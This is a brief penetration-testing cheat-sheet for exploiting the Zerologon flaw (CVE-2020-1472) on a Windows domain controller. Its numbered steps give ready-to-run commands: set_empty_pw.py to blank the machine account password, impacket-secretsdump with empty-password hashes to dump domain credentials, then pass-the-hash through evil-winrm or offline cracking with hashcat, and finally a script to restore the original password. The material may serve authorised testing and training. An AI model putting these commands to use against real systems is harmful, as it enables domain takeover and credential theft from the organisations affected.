## CVE-2020-1472 Zerologon

#### As the name implies, if the machine is vulnerable to Zerologon, it can reset the administrator credentials to an empty string, then attempt to dump the hashes via secretsdump without having to use a password.

### Tools: Impacket-secretsdump, https://github.com/risksense/zerologon, https://github.com/SecuraBV/CVE-2020-1472

#### 1) python3 set_empty_pw.py NETBIOS_NAME DC_IP 

#### 2) If attempt was successful, then: impacket-secretsdump -just-dc -no-pass DOMAIN.LOCAL/NETBIOS_NAME\$DC_IP

#### impacket-secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'

#### 3) When you dump the domain admin hash, you can use it to Pass-the-Hash via evil-winrm or attempt to crack it offline with hashcat

#### 4) At login, copy the SAM and SYSTEM hives to your local machine, then dump them offline (Alternative to secretsdump)

#### 5) python3 reinstall_original_pw.py NETBIOS_NAME DC_IP ORIGINAL_NTLM_ADMIN_HASH (Reinstalls the original password that the admin had to prevent permanent damage on the machine)

### TIP: The LM and NTLM hashes represented in the command are actually the hashed version of empty password/string
